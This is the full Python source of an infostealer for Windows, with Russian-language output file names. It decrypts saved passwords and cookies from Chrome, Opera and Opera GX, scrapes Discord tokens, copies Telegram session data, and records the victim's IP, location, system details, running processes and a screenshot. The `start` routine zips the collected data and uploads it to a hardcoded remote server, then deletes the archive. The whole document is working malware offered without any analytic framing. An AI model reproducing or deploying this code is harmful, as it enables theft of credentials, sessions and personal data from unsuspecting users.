import sqlite3
import shutil
import os
import win32crypt
import json
from base64 import b64decode
from Crypto.Cipher import AES
import re
import platform
import requests
from PIL import ImageGrab
import random
import psutil
from distutils.dir_util import copy_tree

serverip = "195.140.147.62"

serverlink = f"http://{serverip}:8000/uploadfile"


def get_masterkey(path):
    with open(path, "r") as f:
        masterkey = b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:]
        f.close()
    return win32crypt.CryptUnprotectData(masterkey, None, None, None, 0)[1]


def screenshot():
    ss = ImageGrab.grab()
    ss.save("Скриншот.jpg")


def ip_and_location():
    r = requests.get("http://ip-api.com/json").json()
    return "IP: {} Страна: {} Город: {} Координаты: {}, {}".format(r["query"], r["country"], r["city"], r["lat"],
                                                                   r["lon"])


def specs():
    uname = platform.uname()
    geninfo = f"Операционная система: {uname.system} {uname.release} "
    geninfo += f"Имя пк: {uname.node} "
    geninfo += f"Процессор: {uname.processor} "
    return geninfo


def processes():
    proclist = ""

    for proc in psutil.process_iter():
        proc.dict = proc.as_dict(["username", "name"])
        if proc.dict.get("username") is None:
            continue
        if os.getlogin() in proc.dict.get("username"):
            proclist += proc.dict.get("name") + "\n"

    with open("Диспетчер задач.txt", "w") as f:
        f.write(proclist)
        f.close()


def get_info():
    with open("Основная информация.txt", "w", encoding="utf-8") as f:
        ip = ip_and_location()
        print(ip, type(ip))
        info = specs()
        print(info, type(info))
        f.write(info + ip)
        f.close()
    processes()
    screenshot()


def cdupper():
    os.chdir(os.path.split(os.getcwd())[0])


def cookies_decrypt(cpath, keypath):
    cookdata = ""
    dbname = os.path.split(cpath)[1] + ".db"
    shutil.copy(cpath, dbname)

    conn = sqlite3.connect(dbname)
    c = conn.cursor()

    c.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")

    for host_key, name, value, path, expires_utc, is_secure, is_httponly, encrypted_value in c.fetchall():
        try:
            decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(
                "utf-8") or value or 0
        except:
            decrypted_value = AES.new(get_masterkey(keypath), AES.MODE_GCM,
                                      nonce=encrypted_value[3:3 + 12]).decrypt_and_verify(encrypted_value[3 + 12:-16],
                                                                                          encrypted_value[-16:])
        cookdata += str(host_key) + "\t" + str(is_httponly) + "\t/\t" + str(is_secure) + "\t" + str(
            expires_utc) + "\t" + str(name) + "\t" + str(decrypted_value.decode()) + "\n"
    conn.close()
    os.remove(dbname)
    return cookdata


def passwords_decrypt(cpath, keypath):
    passdata = b""
    dbname = os.path.split(cpath)[1] + ".db"
    shutil.copy(cpath, dbname)

    conn = sqlite3.connect(dbname)
    c = conn.cursor()

    c.execute("SELECT action_url, username_value, password_value FROM logins")

    for action_url, username_value, password_value in c.fetchall():
        action_url = action_url.encode("utf-8")
        username_value = username_value.encode("utf-8")
        try:
            decrypted_value = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1].decode("utf-8")
        except:
            iv = password_value[3:15]
            payload = password_value[15:]
            cipher = AES.new(get_masterkey(keypath), AES.MODE_GCM, iv)
            decrypted_value = str(cipher.decrypt(payload)[:-16], "utf-8", "ignore")
        passdata += b"URL: " + action_url + b"\nUsername: " + username_value + b"\nPassword: " + decrypted_value.encode() + b"\n\n"
    conn.close()
    os.remove(dbname)
    return passdata


def chrome_cookies():
    keypath = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State"
    dbpath = [os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies",
              os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies2"]

    if not os.path.isfile(keypath):
        return

    if os.path.isfile(dbpath[0]):
        cookdata = cookies_decrypt(dbpath[0], keypath)
        with open("Куки (Chrome).txt", "w") as f:
            f.write(cookdata)
            f.close()

    if os.path.isfile(dbpath[1]):
        cookdata = cookies_decrypt(dbpath[1], keypath)
        with open("Куки (Chrome) #2.txt", "w") as f:
            f.write(cookdata)
            f.close()


def chrome_passwords():
    keypath = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State"
    dbpath = [os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data",
              os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data2"]

    if not os.path.isfile(keypath):
        return

    if os.path.isfile(dbpath[0]):
        passdata = passwords_decrypt(dbpath[0], keypath)
        with open("Пароли (Chrome).txt", "wb") as f:
            f.write(passdata)
            f.close()

    if os.path.isfile(dbpath[1]):
        passdata = passwords_decrypt(dbpath[1], keypath)
        with open("Пароли (Chrome) #2.txt", "wb") as f:
            f.write(passdata)
            f.close()


def opera_cookies():
    keypath = os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local State"
    dbpath = [os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Cookies",
              os.getenv("LOCALAPPDATA") + "\\Opera Software\\Opera Stable\\Cookies2"]

    if not os.path.isfile(keypath):
        return

    if os.path.isfile(dbpath[0]):
        cookdata = cookies_decrypt(dbpath[0], keypath)
        with open("Куки (Opera).txt", "w") as f:
            f.write(cookdata)
            f.close()

    if os.path.isfile(dbpath[1]):
        cookdata = cookies_decrypt(dbpath[1], keypath)
        with open("Куки (Opera) #2.txt", "w") as f:
            f.write(cookdata)
            f.close()


def opera_passwords():
    keypath = os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local State"
    dbpath = [os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data",
              os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data2"]

    if not os.path.isfile(keypath):
        return

    if os.path.isfile(dbpath[0]):
        passdata = passwords_decrypt(dbpath[0], keypath)
        with open("Пароли (Opera).txt", "wb") as f:
            f.write(passdata)
            f.close()

    if os.path.isfile(dbpath[1]):
        passdata = passwords_decrypt(dbpath[1], keypath)
        with open("Пароли (Opera) #2.txt", "wb") as f:
            f.write(passdata)
            f.close()


def operagx_cookies():
    keypath = os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Local State"
    dbpath = [os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Cookies",
              os.getenv("LOCALAPPDATA") + "\\Opera Software\\Opera GX Stable\\Cookies2"]

    if not os.path.isfile(keypath):
        return

    if os.path.isfile(dbpath[0]):
        cookdata = cookies_decrypt(dbpath[0], keypath)
        with open("Куки (Opera GX).txt", "w") as f:
            f.write(cookdata)
            f.close()

    if os.path.isfile(dbpath[1]):
        cookdata = cookies_decrypt(dbpath[1], keypath)
        with open("Куки (Opera GX) #2.txt", "w") as f:
            f.write(cookdata)
            f.close()


def operagx_passwords():
    keypath = os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Local State"
    dbpath = [os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Login Data",
              os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Login Data2"]

    if not os.path.isfile(keypath):
        return

    if os.path.isfile(dbpath[0]):
        passdata = passwords_decrypt(dbpath[0], keypath)
        with open("Пароли (Opera GX).txt", "wb") as f:
            f.write(passdata)
            f.close()

    if os.path.isfile(dbpath[1]):
        passdata = passwords_decrypt(dbpath[1], keypath)
        with open("Пароли (Opera GX) #2.txt", "wb") as f:
            f.write(passdata)
            f.close()


def find_token(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def discord_token():
    rad = os.getenv("APPDATA")
    lad = os.getenv("LOCALAPPDATA")
    dcpaths = [rad + "\\discord", rad + "\\discordcanary", rad + "\\discordptb",
               lad + "\\Google\\Chrome\\User Data\\Default"]

    for dcpath in dcpaths:
        if not os.path.exists(dcpath):
            dcpaths.remove(dcpath)

    if dcpaths != []:
        tokenslist = find_token(dcpaths[0])
        tokens = "\n".join(tokenslist)
    else:
        tokens = "Discord не установлен!"

    with open("Discord Токены.txt", "w") as f:
        f.write(tokens)
        f.close()


def telegram_ssfn():
    diskletters = ["A", "B", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
                   "V", "W", "X", "Y", "Z"]
    pcdisks = ["C"]
    for i in diskletters:
        if os.path.exists(i + ":\\"):
            pcdisks.append(i + ":\\")

    tgpath = ""
    for i in pcdisks:
        for root, dirs, files in os.walk(i):
            print(files)
            if "Telegram.exe" in files:
                tgpath = root
                break

    if tgpath != "":
        filelist = os.listdir(tgpath + "\\tdata")
        for i in filelist:
            if i == "D877F783D5D3EF8C":
                copy_tree(tgpath + "\\tdata\\" + i, i)
                break


def start():
    os.chdir(os.getenv("TMP"))
    r = requests.get("http://ip-api.com/json").json()
    filename = "{}_{}".format(r["countryCode"], r["query"])
    os.mkdir(filename)
    os.chdir(filename)
    os.mkdir("Браузеры")
    os.chdir("Браузеры")
    chrome_passwords()
    print('chrome passwords get')
    chrome_cookies()
    print('chrome cookies get')
    opera_passwords()
    print('opera passwords get')
    opera_cookies()
    print('opera cookies get')
    operagx_passwords()
    print('operagx passwords get')
    operagx_cookies()
    print('operagx cookies get')
    cdupper()
    os.mkdir("Другое")
    os.chdir("Другое")
    discord_token()
    telegram_ssfn()
    cdupper()
    get_info()
    cdupper()
    shutil.make_archive(filename, "zip", filename)
    shutil.rmtree(filename)
    with open(f"{filename}.zip", "rb") as f:
        req = requests.post(serverlink, files={"file": f}).text
        print(req)
        f.close()
    os.remove(f"{filename}.zip")


if __name__ == "__main__":
    start()
